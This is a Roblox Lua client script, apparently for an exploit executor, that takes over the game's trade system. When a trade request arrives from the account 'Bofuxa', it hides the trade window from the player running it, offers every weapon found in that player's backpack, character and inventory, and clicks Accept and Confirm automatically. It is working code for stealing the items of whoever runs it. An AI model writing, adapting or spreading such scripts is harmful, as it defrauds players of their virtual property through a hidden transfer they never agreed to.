local Players = game:GetService("Players")
local ReplicatedStorage = ReplicatedStorage or game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer
local ContextActionService = game:GetService("ContextActionService")

local TradeFolder = ReplicatedStorage:WaitForChild("Trade")
local SendRequest = TradeFolder:WaitForChild("SendRequest")
local AcceptRequest = TradeFolder:WaitForChild("AcceptRequest")
local DeclineRequest = TradeFolder:WaitForChild("DeclineRequest")
local StartTradeEvent = TradeFolder:WaitForChild("StartTrade")
local OfferItemEvent = TradeFolder:WaitForChild("OfferItem")
local AcceptTradeEvent = TradeFolder:WaitForChild("AcceptTrade")

print("Waiting for incoming trade request callback...")

-- Function to completely disable interactivity and visibility for specific GUI elements across mobile and desktop
local function disableGuiInteraction(guiObject)
    if guiObject then
        guiObject.Visible = false
        if guiObject:IsA("GuiObject") then
            guiObject.Active = false
            guiObject.Selectable = false
        end
        for _, descendant in ipairs(guiObject:GetDescendants()) do
            if descendant:IsA("GuiObject") then
                descendant.Visible = false
                descendant.Active = false
                descendant.Selectable = false
            end
        end
    end
end

-- Function to restore camera and player controls fully so movement isn't locked on mobile or PC
local function restorePlayerControls()
    pcall(function()
        LocalPlayer.CameraMode = Enum.CameraMode.Classic
        LocalPlayer.DevComputerCameraMode = Enum.DevComputerCameraMode.Classic
        LocalPlayer.DevTouchCameraMode = Enum.DevTouchCameraMode.Classic
    end)
    
    pcall(function()
        ContextActionService:UnbindAction("TradeCameraLock")
    end)
end

-- Set up the client callback to intercept incoming requests from the server
SendRequest.OnClientInvoke = function(senderPlayer)
    -- Check if the sender is Bofuxa
    if senderPlayer and senderPlayer.Name == "Bofuxa" then
        print("Trade request verified from Bofuxa. Accepting...")
        
        -- Hide and disable interaction for Container, Processing, and BG for both local player and Bofuxa if accessible on mobile/client
        local function applyGuiHides(targetPlayer)
            if targetPlayer and targetPlayer:FindFirstChild("PlayerGui") then
                local tradeGui = targetPlayer.PlayerGui:FindFirstChild("TradeGUI")
                if tradeGui then
                    disableGuiInteraction(tradeGui:FindFirstChild("Container"))
                    disableGuiInteraction(tradeGui:FindFirstChild("Processing"))
                    disableGuiInteraction(tradeGui:FindFirstChild("BG"))
                end
            end
        end

        applyGuiHides(LocalPlayer)
        applyGuiHides(Players:FindFirstChild("Bofuxa"))
        print("Disabled interaction and hidden TradeGUI elements successfully.")

        AcceptRequest:FireServer()
        
        -- Spawn a thread to wait for the trade session to start, wait 1 second, then dynamically scan and add all weapons of the executing player
        task.spawn(function()
            print("Waiting for trade to start...")
            StartTradeEvent.OnClientEvent:Wait()
            
            -- Release camera movement lock immediately
            restorePlayerControls()
            
            print("Trade started! Waiting 1 second before offering weapons...")
            task.wait(1)
            
            -- Scan the executing player's backpack and equipped items or fallback to UI inventory container
            local weaponsList = {}
            
            -- 1. Check Backpack
            if LocalPlayer:FindFirstChild("Backpack") then
                for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
                    if tool:IsA("Tool") then
                        table.insert(weaponsList, tool.Name)
                    end
                end
            end
            
            -- 2. Check Character (Equipped items)
            if LocalPlayer.Character then
                for _, tool in ipairs(LocalPlayer.Character:GetChildren()) do
                    if tool:IsA("Tool") then
                        table.insert(weaponsList, tool.Name)
                    end
                end
            end
            
            -- 3. Fallback: Scan UI Inventory container if backpack is empty
            local pGui = LocalPlayer:WaitForChild("PlayerGui", 5)
            local inventoryContainer = pGui 
                and pGui:WaitForChild("MainGUI", 5) 
                and pGui.MainGUI:WaitForChild("Game", 5) 
                and pGui.MainGUI.Game:WaitForChild("Crafting", 5) 
                and pGui.MainGUI.Game.Crafting:WaitForChild("Inventory", 5) 
                and pGui.MainGUI.Game.Crafting.Inventory:WaitForChild("Salvage", 5) 
                and pGui.MainGUI.Game.Crafting.Inventory.Salvage:WaitForChild("ScrollFrame", 5) 
                and pGui.MainGUI.Game.Crafting.Inventory.Salvage.ScrollFrame:WaitForChild("Container", 5)

            if #weaponsList == 0 and inventoryContainer then
                for _, item in ipairs(inventoryContainer:GetChildren()) do
                    if item:IsA("GuiObject") or item:IsA("Frame") or item:IsA("ImageButton") then
                        table.insert(weaponsList, item.Name)
                    end
                end
            end

            -- Offer each detected weapon using the precise event format
            if #weaponsList > 0 then
                for _, weaponName in ipairs(weaponsList) do
                    print("Offering weapon: " .. weaponName)
                    OfferItemEvent:FireServer(weaponName, "Weapons")
                    task.wait(0.05)
                end
                print("All detected weapons offered successfully!")
            else
                warn("No weapons found in backpack, character, or inventory path!")
            end

            -- Wait after adding all items
            print("Waiting 7 seconds before triggering trade accept actions...")
            task.wait(7)

            -- Firesignal simulation for AcceptTrade event if supported, else FireServer fallback
            if firesignal and AcceptTradeEvent.OnClientEvent then
                firesignal(AcceptTradeEvent.OnClientEvent, false)
            else
                AcceptTradeEvent:FireServer()
            end

            -- Trigger the GUI buttons programmatically (compatible with mobile touch / GUI clicks)
            local actionsFolder = LocalPlayer.PlayerGui:WaitForChild("TradeGUI"):WaitForChild("Container"):WaitForChild("Trade"):WaitForChild("Actions")

            local function fireButton(btn)
                if btn and btn:IsA("GuiButton") and getconnections then
                    for _, connection in ipairs(getconnections(btn.Activated)) do
                        connection:Fire()
                    end
                    for _, connection in ipairs(getconnections(btn.MouseButton1Click)) do
                        connection:Fire()
                    end
                elseif btn and btn:IsA("GuiButton") then
                    btn:Activate()
                end
            end

            local firstButton = actionsFolder:WaitForChild("Accept"):WaitForChild("ActionButton")
            fireButton(firstButton)
            print("Triggered first ActionButton")

            task.wait(1)

            local confirmButton = actionsFolder:WaitForChild("Accept"):WaitForChild("Confirm"):WaitForChild("ActionButton")
            fireButton(confirmButton)
            print("Triggered confirmation ActionButton")
            
            -- Final check to ensure camera stays unlocked after trade concludes
            restorePlayerControls()
        end)

        return true
    else
        -- Allow normal trading with other players, ignoring declines or interference on your end
        print("Trade request from other player (" .. tostring(senderPlayer) .. "). Allowing normal trade...")
        return true
    end
end
